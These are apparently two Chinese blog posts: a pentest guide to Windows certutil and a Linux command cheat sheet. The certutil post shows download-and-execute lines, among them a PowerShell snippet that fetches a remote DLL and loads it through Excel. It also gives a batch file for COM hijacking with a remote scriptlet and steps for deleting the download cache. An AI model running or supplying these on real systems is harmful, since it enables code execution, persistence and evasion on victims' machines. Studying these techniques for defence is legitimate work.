或不允许的证书 CTL<br>-syncWithWU &nbsp; &nbsp; &nbsp; – 与 Windows 更新同步<br>-generateSSTFromWU – 通过 Windows 更新生成 SST<br>-generatePinRulesCTL – 生成捆绑规则 CTL<br>-downloadOcsp &nbsp; &nbsp; – 下载 OCSP 响应并写入目录<br>-generateHpkpHeader – 使用指定文件或目录中的证书生成 HPKP 头<br>-flushCache &nbsp; &nbsp; &nbsp; – 刷新选定进程(例如 lsass.exe)中的指定缓存<br>-addEccCurve &nbsp; &nbsp; &nbsp;– 添加 ECC 曲线<br>-deleteEccCurve &nbsp; – 删除 ECC 曲线<br>-displayEccCurve &nbsp;– 显示 ECC 曲线<br>-sign &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 重新签名 CRL 或证书</p><p>-vroot &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 创建/删除 Web 虚拟根和文件共享<br>-vocsproot &nbsp; &nbsp; &nbsp; &nbsp;– 创建/删除 OCSP Web Proxy 的 Web 虚拟根<br>-addEnrollmentServer – 添加注册服务器应用程序<br>-deleteEnrollmentServer – 删除注册服务器应用程序<br>-addPolicyServer &nbsp;– 添加策略服务器应用程序<br>-deletePolicyServer – 删除策略服务器应用程序<br>-oid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 显示 ObjectId 或设置显示名称<br>-error &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 显示错误代码消息文本<br>-getreg &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 显示注册表值<br>-setreg &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 设置注册表值<br>-delreg &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 删除注册表值</p><p>-ImportKMS &nbsp; &nbsp; &nbsp; &nbsp;– 为密钥存档导入用户密钥和证书到服务器数据库<br>-ImportCert &nbsp; &nbsp; &nbsp; – 将证书文件导入数据库<br>-GetKey &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 检索存档的私钥恢复 Blob，生成恢复脚本 或恢复存档的密钥<br>-RecoverKey &nbsp; &nbsp; &nbsp; – 恢复存档的私钥<br>-MergePFX &nbsp; &nbsp; &nbsp; &nbsp; – 合并 PFX 文件<br>-ConvertEPF &nbsp; &nbsp; &nbsp; – 将 PFX 文件转换为 EPF 文件</p><p>-add-chain &nbsp; &nbsp; &nbsp; &nbsp;– (-AddChain) 添加证书链<br>-add-pre-chain &nbsp; &nbsp;– (-AddPrechain) 添加预植证书链<br>-get-sth &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– (-GetSTH) 获取签名树头<br>-get-sth-consistency – (-GetSTHConsistency) 获取签名树头更改<br>-get-proof-by-hash – (-GetProofByHash) 获取哈希证明<br>-get-entries &nbsp; &nbsp; &nbsp;– (-GetEntries) 获取项<br>-get-roots &nbsp; &nbsp; &nbsp; &nbsp;– (-GetRoots) 获取根<br>-get-entry-and-proof – (-GetEntryAndProof) 获取项和证明<br>-VerifyCT &nbsp; &nbsp; &nbsp; &nbsp; – 验证证书 SCT<br>-? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 显示该用法消息</p><p>CertUtil -? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;– 显示动词列表(命名列表)<br>CertUtil -dump -? &nbsp; &nbsp; &nbsp; &nbsp;– 显示 “dump” 动词的帮助文本<br>CertUtil -v -? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; – 显示所有动词的所有帮助文本</p><h3 id="2-使用案例"><a href="#2-使用案例" class="headerlink" title="2.使用案例"></a>2.使用案例</h3><h4 id="certutil-简介"><a href="#certutil-简介" class="headerlink" title="certutil 简介"></a>certutil 简介</h4><p>用于备份证书服务管理,支持 xp-win10</p><p>更多操作说明见<a href="https://technet.microsoft.com/zh-cn/library/cc755341(v=ws.10).aspx">https://technet.microsoft.com/zh-cn/library/cc755341(v=ws.10).aspx</a></p><h4 id="渗透测试中的应用"><a href="#渗透测试中的应用" class="headerlink" title="渗透测试中的应用"></a>渗透测试中的应用</h4><h5 id="1、downloader"><a href="#1、downloader" class="headerlink" title="1、downloader"></a>1、downloader</h5><p>(1) 保存在当前路径，文件名称和下载文件名称相同</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">certutil  <span class="token operator">-</span>urlcache  <span class="token operator">-</span>split  <span class="token operator">-</span>f  https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>backlion<span class="token operator">/</span>demo<span class="token operator">/</span>blob<span class="token operator">/</span>master<span class="token operator">/</span>weblogic<span class="token punctuation">.</span>py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767711947-18c8dd7f-f62c-43f6-adc9-95ef4ae50d42.png#align=left&amp;display=inline&amp;height=284&amp;margin=%5Bobject%20Object%5D&amp;name=20190428102711915_2912.png&amp;originHeight=284&amp;originWidth=558&amp;size=64996&amp;status=done&amp;style=none&amp;width=558" alt="20190428102711915_2912.png"><br>(2) 保存在当前路径，指定保存文件名称</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">certutil  -urlcache  -split  -f   https://github.com/backlion/demo/blob/master/weblogic.py  test.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767739599-4ab6ac17-aba2-4413-bc56-bb662abad41b.png#align=left&amp;display=inline&amp;height=285&amp;margin=%5Bobject%20Object%5D&amp;name=20190428102735667_6681.png&amp;originHeight=285&amp;originWidth=558&amp;size=67594&amp;status=done&amp;style=none&amp;width=558" alt="20190428102735667_6681.png"><br>(3) 保存在缓存目录，名称随机<br>缓存目录位置： &nbsp;%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">certutil  -urlcache   -f   https://github.com/backlion/demo/blob/master/weblogic.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767764906-c9dd433e-ba52-4d88-a2bf-1db6af39f72f.png#align=left&amp;display=inline&amp;height=292&amp;margin=%5Bobject%20Object%5D&amp;name=20190428102839822_16446.png&amp;originHeight=292&amp;originWidth=558&amp;size=70848&amp;status=done&amp;style=none&amp;width=558" alt="20190428102839822_16446.png"><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767766105-93b9f4c1-5915-49cf-bdf1-18d1b88f7552.png#align=left&amp;display=inline&amp;height=441&amp;margin=%5Bobject%20Object%5D&amp;name=20190428102857223_3192.png&amp;originHeight=441&amp;originWidth=558&amp;size=198209&amp;status=done&amp;style=none&amp;width=558" alt="20190428102857223_3192.png"></p><h5 id="2、清除下载文件副本方法"><a href="#2、清除下载文件副本方法" class="headerlink" title="2、清除下载文件副本方法"></a>2、清除下载文件副本方法</h5><p>（1） 方法一，直接删除缓存目录对应文件<br>如下图:<br><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767796025-d5970151-e9e9-4ac2-9cae-b0ba450abd6e.png#align=left&amp;display=inline&amp;height=441&amp;margin=%5Bobject%20Object%5D&amp;name=20190428102908757_6260.png&amp;originHeight=441&amp;originWidth=558&amp;size=198209&amp;status=done&amp;style=none&amp;width=558" alt="20190428102908757_6260.png"><br>（2）方法二，命令行:</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">certutil  -urlcache   -f   https://github.com/backlion/demo/blob/master/weblogic.py delete<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767814698-c3cca03c-361b-43f1-abfa-a3f73bf41df8.png#align=left&amp;display=inline&amp;height=131&amp;margin=%5Bobject%20Object%5D&amp;name=20190428102923603_13046.png&amp;originHeight=131&amp;originWidth=558&amp;size=33719&amp;status=done&amp;style=none&amp;width=558" alt="20190428102923603_13046.png"><br>（3） 补充：<br>查看缓存项目：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">certutil.exe -urlcache *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图<br><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767824457-40b9415c-b3f7-4176-8760-5036db7177da.png#align=left&amp;display=inline&amp;height=345&amp;margin=%5Bobject%20Object%5D&amp;name=20190428102935629_14020.png&amp;originHeight=345&amp;originWidth=558&amp;size=159191&amp;status=done&amp;style=none&amp;width=558" alt="20190428102935629_14020.png"></p><h5 id="3、实际测试"><a href="#3、实际测试" class="headerlink" title="3、实际测试"></a>3、实际测试</h5><p>(1) powershell 中的利用<br>测试系统安装 Office 软件，下载执行 dll 对应的 powershell 代码如下：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$path</span>=<span class="token string">"D:\test\msg1.dll"</span> certutil<span class="token punctuation">.</span>exe <span class="token operator">-</span>urlcache <span class="token operator">-</span>split <span class="token operator">-</span>f https:<span class="token operator">/</span><span class="token operator">/</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com<span class="token operator">/</span>3gstudent<span class="token operator">/</span>test<span class="token operator">/</span>master<span class="token operator">/</span>msg<span class="token punctuation">.</span>dll  <span class="token variable">$path</span><span class="token variable">$excel</span> = <span class="token namespace">[activator]</span>::CreateInstance<span class="token punctuation">(</span><span class="token namespace">[type]</span>::GetTypeFromProgID<span class="token punctuation">(</span><span class="token string">"Excel.Application"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token variable">$excel</span><span class="token punctuation">.</span>RegisterXLL<span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>测试如下图<br><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767840650-1cb0b715-20b3-4544-938a-4139c1513b59.png#align=left&amp;display=inline&amp;height=356&amp;margin=%5Bobject%20Object%5D&amp;name=20190428103020940_17740.png&amp;originHeight=356&amp;originWidth=558&amp;size=95817&amp;status=done&amp;style=none&amp;width=558" alt="20190428103020940_17740.png"><br>(2) 下载劫持 com 的 sct 的批处理文件<br>test.bat(这里批处理是利用到 certutil 下载 sct 文件劫持 com 弹出计算器）：</p><pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">@echo offreg add HKEY_CURRENT_USER\SOFTWARE\Classes\Bandit.1.00 /ve /t REG_SZ /d Bandit /f 1&gt;nul 2&gt;&amp;1reg add HKEY_CURRENT_USER\SOFTWARE\Classes\Bandit.1.00\CLSID /ve /t REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f 1&gt;nul 2&gt;&amp;1reg add HKEY_CURRENT_USER\SOFTWARE\Classes\Bandit /ve /t REG_SZ /d Bandit /f 1&gt;nul 2&gt;&amp;1reg add HKEY_CURRENT_USER\SOFTWARE\Classes\Bandit\CLSID /ve /t REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f 1&gt;nul 2&gt;&amp;1reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC} /ve /t REG_SZ /d Bandit /f 1&gt;nul 2&gt;&amp;1reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32 /ve /t REG_SZ /d C:\WINDOWS\system32\scrobj.dll /f 1&gt;nul 2&gt;&amp;1reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32 /v ThreadingModel  /t REG_SZ /d Apartment /f 1&gt;nul 2&gt;&amp;1reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID /ve /t REG_SZ /d Bandit.1.00 /f 1&gt;nul 2&gt;&amp;1reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL /ve /t REG_SZ /d https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct /f 1&gt;nul 2&gt;&amp;1reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID /ve /t REG_SZ /d Bandit /f 1&gt;nul 2&gt;&amp;1reg add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{372FCE38-4324-11D0-8810-00A0C903B83C}\TreatAs /ve /t REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f 1&gt;nul 2&gt;&amp;1certutil 1&gt;nul 2&gt;&amp;1reg delete HKEY_CURRENT_USER\SOFTWARE\Classes\Bandit.1.00 /f 1&gt;nul 2&gt;&amp;1reg delete HKEY_CURRENT_USER\SOFTWARE\Classes\Bandit /f 1&gt;nul 2&gt;&amp;1reg delete HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC} /f 1&gt;nul 2&gt;&amp;1reg delete HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{372FCE38-4324-11D0-8810-00A0C903B83C}\TreatAs /f 1&gt;nul 2&gt;&amp;1echo Done!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里测试的 test.scr:<br><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767874595-1a00f74f-9d3b-4ad8-98ae-42adabd24eeb.png#align=left&amp;display=inline&amp;height=234&amp;margin=%5Bobject%20Object%5D&amp;name=20190428103049715_20490.png&amp;originHeight=234&amp;originWidth=558&amp;size=34097&amp;status=done&amp;style=none&amp;width=558" alt="20190428103049715_20490.png"><br>注意：在实战中需要替换该批处理文件中地址:<br><a href="https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct">https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</a>为你自己需要的 sct（劫持 com）文件</p><p>运行批处理如下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767885296-eafd54bb-b5cb-4c96-8a7d-70091c9251e4.png#align=left&amp;display=inline&amp;height=344&amp;margin=%5Bobject%20Object%5D&amp;name=20190428103147720_16446.png&amp;originHeight=344&amp;originWidth=558&amp;size=76898&amp;status=done&amp;style=none&amp;width=558" alt="20190428103147720_16446.png"></p><h5 id="4、计算文件-hash"><a href="#4、计算文件-hash" class="headerlink" title="4、计算文件 hash"></a>4、计算文件 hash</h5><p>(1) SHA1</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">certutil  -hashfile msg1.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767895835-afc41104-cf9b-4054-a64c-9851a7cb009b.png#align=left&amp;display=inline&amp;height=140&amp;margin=%5Bobject%20Object%5D&amp;name=20190428103200430_25610.png&amp;originHeight=140&amp;originWidth=558&amp;size=20918&amp;status=done&amp;style=none&amp;width=558" alt="20190428103200430_25610.png"></p><p>(2) SHA256：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">certutil  -hashfile msg1.dll SHA256<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767914179-5114905b-af17-4128-9868-a4a65f381df4.png#align=left&amp;display=inline&amp;height=113&amp;margin=%5Bobject%20Object%5D&amp;name=20190428103215284_27232.png&amp;originHeight=113&amp;originWidth=558&amp;size=23728&amp;status=done&amp;style=none&amp;width=558" alt="20190428103215284_27232.png"></p><p>(3) MD5：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">certutil  -hashfile msg1.dll MD5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767926644-2022ebce-f403-4f5d-9fc4-34ba29ae1836.png#align=left&amp;display=inline&amp;height=108&amp;margin=%5Bobject%20Object%5D&amp;name=20190428103230984_21852.png&amp;originHeight=108&amp;originWidth=424&amp;size=3306&amp;status=done&amp;style=none&amp;width=424" alt="20190428103230984_21852.png"></p><p>5、base64 编码转换<br>(1) base64 编码：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">CertUtil -encode InFile OutFile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767936697-d4d31cb2-0a3c-4275-b59a-e179260a16c6.png#align=left&amp;display=inline&amp;height=294&amp;margin=%5Bobject%20Object%5D&amp;name=20190428103313797_24796.png&amp;originHeight=294&amp;originWidth=558&amp;size=74006&amp;status=done&amp;style=none&amp;width=558" alt="20190428103313797_24796.png"><br>(2) base64 解码</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">CertUtil -decode InFile OutFile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767945193-0cfeb992-2ece-4dc2-98fd-f8e1cf567287.png#align=left&amp;display=inline&amp;height=354&amp;margin=%5Bobject%20Object%5D&amp;name=20190428103325621_17842.png&amp;originHeight=354&amp;originWidth=558&amp;size=30232&amp;status=done&amp;style=none&amp;width=558" alt="20190428103325621_17842.png"><br>注：<br>编码后的文件会添加两处标识信息：<br>文件头：<br>—–BEGIN CERTIFICATE—–<br>文件尾：<br>—–END CERTIFICATE—–<br>如下图<br><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1603767953706-ce7ebad2-15ea-4c92-9496-0436ecb5e281.png#align=left&amp;display=inline&amp;height=298&amp;margin=%5Bobject%20Object%5D&amp;name=20190428103358130_31519.png&amp;originHeight=298&amp;originWidth=457&amp;size=10413&amp;status=done&amp;style=none&amp;width=457" alt="20190428103358130_31519.png"></p><h3 id="downloader-常用方法"><a href="#downloader-常用方法" class="headerlink" title="downloader 常用方法"></a>downloader 常用方法</h3><p>常用的 cmd 下 downloader 方法，相比来说，利用 certUtil 简便快捷，但是使用后需要注意清除缓存，路径如下：<br>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</p><p>downloader 常用方法如下：<br>· certUtil<br>· powershell<br>· csc<br>· vbs<br>· JScript<br>· hta<br>· bitsadmin<br>· wget<br>· debug<br>· ftp<br>· ftfp</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文介绍了 certutil 在渗透测试中的应用，详细介绍利用 certutil 作 downloader 的实现方法和检测方法<br>更多学习请看<a href="https://3gstudent.github.io/">https://3gstudent.github.io/</a>本文的出处</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令整理</title>
      <link href="/2020/10/22/yuque/isxtc8/"/>
      <url>/2020/10/22/yuque/isxtc8/</url>
      
        <content type="html"><![CDATA[<h1 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 详细参数请自行百度，这里只是常用参数</span><span class="token comment"># 树形显示目录结构</span><span class="token comment"># 颜色突出的形式 展示2层</span>tree -C -L <span class="token number">2</span><span class="token comment">#查看进程树(可以直观的看到进程父子关系,可用来排查木马/病毒) -p:显示pid</span>pstree -p<span class="token comment">###控制进程运行在那些核心上(多核心独立分配效果明显,核心较少时资源紧张意义不大)</span><span class="token comment">#减少cpu上下文切换的开销,节约时间,提高效率.</span>taskset -cp <span class="token number">1,2</span> PID<span class="token comment"># 系统资源监控</span><span class="token comment">## 内存监控</span><span class="token function">free</span><span class="token comment">## 综合监控</span><span class="token function">top</span><span class="token function">htop</span> <span class="token comment"># 彩色界面功能更加丰富</span><span class="token comment">#修改时间 2021年8月9日12时1分 (月日时分年)</span><span class="token function">sudo</span> <span class="token function">date</span> 080912012021<span class="token comment">#将当前时间和日期写入BIOS，避免重启后失效：</span><span class="token function">sudo</span> hwclock -w<span class="token comment">#更新系统时间</span><span class="token function">sudo</span> ntpdate -u ntp.aliyun.com<span class="token comment">###压力测试</span><span class="token comment">##系统压力测试软件 可以测试Linux系统cpu/menory/IO/disk 的负载</span>stress<span class="token comment">#参数解释</span><span class="token comment"># -? 显示帮助信息</span><span class="token comment"># -v 显示版本号</span><span class="token comment"># -q 不显示运行信息</span><span class="token comment"># -n 显示已完成的指令情况</span><span class="token comment"># -t --timeout N 指定运行N秒后停止</span><span class="token comment">#    --backoff N 等待N微秒后开始运行</span><span class="token comment"># -c N 产生N个进程 每个进程都反复不停的计算平方根,测试cpu</span><span class="token comment"># -i N 产生N个进程 每个进程都反复调用sync(),sync()用于将内存上的内容写入到硬盘上,测试磁盘</span><span class="token comment"># -m --vm N 产生N个进程 每个进程不断调用内存分配malloc()和内存释放free()函数,测试内存</span><span class="token comment">#    --vm-bytes B 指定malloc时内存的字节数(默认256MB)</span><span class="token comment">#    --vm-hang N 指定在free栈的秒数</span><span class="token comment"># -d --hadd N 产生N个执行write和unlink函数的进程</span><span class="token comment">#    --hadd-bytes B 指定写的字节数</span><span class="token comment">#    --hadd-nodean 不unlink</span><span class="token comment"># 注:时间单位可以为 s(秒)/m(分)/h(小时)/d(天)/y(年),文件大小单位可以为KB/MB/GB</span><span class="token comment"># 例1:产生两个cpu进程,两个io进程,20秒停止运行</span><span class="token comment"># stress -c 2 -i 2 --verbose --timeout 20s</span><span class="token comment">##接口并发压力测试工具</span><span class="token comment">#webbench</span>webbench -c 并发数 -t 并发时间 网址webbench -c <span class="token number">300</span> -t <span class="token number">10</span> http://localhost/home/Redis1/order<span class="token comment">#Apache的ab</span><span class="token comment">#Apache的ab命令模拟多线程并发请求，测试服务器负载压力，也可以测试nginx、lighthttp、IIS等其它Web服务器的压力。</span><span class="token comment">#ab命令对发出负载的计算机要求很低，既不会占用很多CPU，也不会占用太多的内存，但却会给目标服务器造成巨大的负载，</span><span class="token comment">#因此是某些DDOS攻击之必备良药，老少皆宜。自己使用也须谨慎。否则一次上太多的负载，造成目标服务器直接因内存耗光死机，而不得不硬重启，得不偿失。</span><span class="token comment">#在带宽不足的情况下，最好是本机进行测试，建议使用内网的另一台或者多台服务器通过内网进行测试，这样得出的数据，准确度会高很多。</span><span class="token comment">#远程对web服务器进行压力测试，往往效果不理想（因为网络延时过大或带宽不足）</span><span class="token comment"># -n发出800个请求，-c模拟800并发，相当800人同时访问，后面是测试url</span>ab -n <span class="token number">800</span> -c <span class="token number">800</span>  http://192.168.0.10/<span class="token comment"># 在60秒内发请求，一次100个请求。</span>ab -t <span class="token number">60</span> -c <span class="token number">100</span> http://192.168.0.10/<span class="token comment"># 如果需要在url中带参数，这样做</span><span class="token comment"># p.txt 是和ab.exe在一个目录</span><span class="token comment"># p.txt 中可以写参数，如  p=wdp&amp;fq=78</span>ab -t <span class="token number">60</span> -c <span class="token number">100</span> -T <span class="token string">"text/plain"</span> -p p.txt http://192.168.0.10/hello.html<span class="token comment">#基于对内核空间修改进行进程信息隐藏的手法,这一类的手法就比较高深了</span>rootkit<span class="token comment"># 统计当前位置下文件夹个数（不含子目录）</span><span class="token function">ls</span> -l ./<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"^d"</span><span class="token operator">|</span><span class="token function">wc</span> -l<span class="token comment"># 统计当前位置下文件夹个数（含子目录）</span><span class="token function">ls</span> -lR ./<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"^d"</span><span class="token operator">|</span><span class="token function">wc</span> -l<span class="token comment"># 统计当前位置下文件个数（不含子目录文件）</span><span class="token function">ls</span> -l ./<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"^-"</span><span class="token operator">|</span><span class="token function">wc</span> -l<span class="token comment"># 统计当前位置下文件个数（含子目录文件）</span><span class="token function">ls</span> -lR ./<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"^-"</span><span class="token operator">|</span><span class="token function">wc</span> -l<span class="token comment"># 配置系统编码(debian系列)</span>dpkg-reconfigre locales<span class="token comment">#######lsof</span>lsof可以替代netstat和ps的全部工作。它可以带来那些工具所能带来的一切，而且要比那些工具多得多。那么，让我们来看看它的一些基本能力吧：关键选项理解一些关于lsof如何工作的关键性东西是很重要的。最重要的是，当你给它传递选项时，默认行为是对结果进行“或”运算。因此，如果你正是用-i来拉出一个端口列表，同时又用-p来拉出一个进程列表，那么默认情况下你会获得两者的结果。下面的一些其它东西需要牢记：默认 <span class="token builtin class-name">:</span> 没有选项，lsof列出活跃进程的所有打开文件组合 <span class="token builtin class-name">:</span> 可以将选项组合到一起，如-abc，但要当心哪些选项需要参数-a <span class="token builtin class-name">:</span> 结果进行“与”运算（而不是“或”）-l <span class="token builtin class-name">:</span> 在输出显示用户ID而不是用户名-h <span class="token builtin class-name">:</span> 获得帮助-t <span class="token builtin class-name">:</span> 仅获取进程ID-U <span class="token builtin class-name">:</span> 获取UNIX套接口地址-F <span class="token builtin class-name">:</span> 格式化输出结果，用于其它命令。可以通过多种方式格式化，如-F pcfn（用于进程id、命令名、文件描述符、文件名，并以空终止）<span class="token comment">###获取网络信息    获取关于系统怎么和网络交互的信息</span><span class="token comment">#使用-i显示所有连接</span><span class="token function">lsof</span>  -i<span class="token comment">#使用-i 4/6仅获取IPv4/IPv6流量</span><span class="token function">lsof</span>  -i <span class="token number">6</span><span class="token comment">#仅显示TCP连接（同理可获得UDP连接）</span><span class="token function">lsof</span>  -iTCP<span class="token comment">#使用-i:port来显示与指定端口相关的网络信息</span><span class="token function">lsof</span>  -i :22<span class="token comment">#使用@host来显示指定到指定主机的连接</span><span class="token function">lsof</span>  -i@172.16.12.5<span class="token comment">#使用@host:port显示基于主机与端口的连接</span><span class="token function">lsof</span>  -i@172.16.12.5:22<span class="token comment">#找出监听端口  找出正等候连接的端口。</span><span class="token function">lsof</span>  -i -sTCP:LISTEN<span class="token comment">#也可以grep “LISTEN”来完成该任务。</span><span class="token function">lsof</span>  -i <span class="token operator">|</span>  <span class="token function">grep</span>  -i LISTEN<span class="token comment">#找出已建立的连接</span><span class="token function">lsof</span>  -i -sTCP:ESTABLISHED<span class="token comment">#也可以通过grep搜索“ESTABLISHED”来完成该任务</span><span class="token function">lsof</span>  -i <span class="token operator">|</span>  <span class="token function">grep</span>  -i ESTABLISHED<span class="token comment">###用户信息   可以获取各种用户的信息，以及它们在系统上正干着的事情，包括它们的网络活动、对文件的操作等。</span><span class="token comment">#使用-u显示指定用户打开了什么</span><span class="token function">lsof</span>  -u root<span class="token comment">#使用-u user来显示除指定用户以外的其它所有用户所做的事情</span><span class="token function">lsof</span>  -u ^daniel<span class="token comment">#杀死指定用户所做的一切事情    可以消灭指定用户运行的所有东西</span><span class="token function">kill</span>  -9  <span class="token variable"><span class="token variable">`</span><span class="token function">lsof</span> -t -u daniel<span class="token variable">`</span></span><span class="token comment">###命令和进程     可以查看指定程序或进程由什么启动，这通常会很有用，而你可以使用lsof通过名称或进程ID过滤来完成这个任务</span><span class="token comment">#使用-c查看指定的命令正在使用的文件和网络连接</span><span class="token function">lsof</span>  -c syslog-ng<span class="token comment">#使用-p查看指定进程ID已打开的内容</span><span class="token function">lsof</span>  -p <span class="token number">10075</span><span class="token comment">#-t选项只返回PID</span><span class="token function">lsof</span>  -t -c Mail<span class="token comment">###文件和目录     通过查看指定文件或目录，你可以看到系统上所有正与其交互的资源——包括用户、进程等。</span><span class="token comment">#显示与指定目录交互的所有一切    查看目录被那个进程占用(可以得到占用进程的pid)</span><span class="token function">lsof</span>  /var/log/messages/<span class="token comment">#显示与指定文件交互的所有一切</span><span class="token function">lsof</span>  /home/daniel/firewall_whitelist.txt<span class="token comment">###高级用法   与tcpdump类似，当你开始组合查询时，它就显示了它强大的功能。</span><span class="token comment">#显示root连接到1.1.1.1所做的一切</span><span class="token function">lsof</span>  -u root -i @1.1.1.1<span class="token comment">#同时使用-t和-c选项以给进程发送 HUP 信号</span><span class="token function">kill</span>  -HUP <span class="token variable"><span class="token variable">`</span><span class="token function">lsof</span> -t -c sshd<span class="token variable">`</span></span><span class="token comment">#lsof +L1显示所有打开的链接数小于1的文件     这通常（当不总是）表示某个攻击者正尝试通过删除文件入口来隐藏文件内容。</span><span class="token function">lsof</span>  +L1<span class="token comment">#显示某个端口范围的打开的连接</span><span class="token function">lsof</span>  -i @fw.google.com:2150<span class="token operator">=</span><span class="token number">2180</span><span class="token comment">####### 虚拟内存</span><span class="token comment">#查看当前虚拟内存： cat /proc/swaps</span><span class="token comment">#创建swap文件：cd / &amp;&amp; sudo dd if=/dev/zero of=swaps bs=512 count=8388616；其中swaps大小为：bs*count=4G</span><span class="token comment">#通过mkswap命令把上一步创建的文件做成swap分区：mkswap /swaps</span><span class="token comment">#查看内核参数：cat /proc/sys/vm/swappiness</span><span class="token comment">#修改内核参数：sudo vim /etc/sysctl.conf 将 vm.swappiness修改为60（表示100% -60% = 40% 物理内存时启用虚拟内存）</span><span class="token comment">#启用分区：sudo swapon /swaps</span><span class="token comment">#修改以使重启启用分区： sudo vim /etc/fstab 添加/swaps swap swap defaults 0 0</span><span class="token comment"># 查看当前目录占用大小</span><span class="token function">du</span> -sh 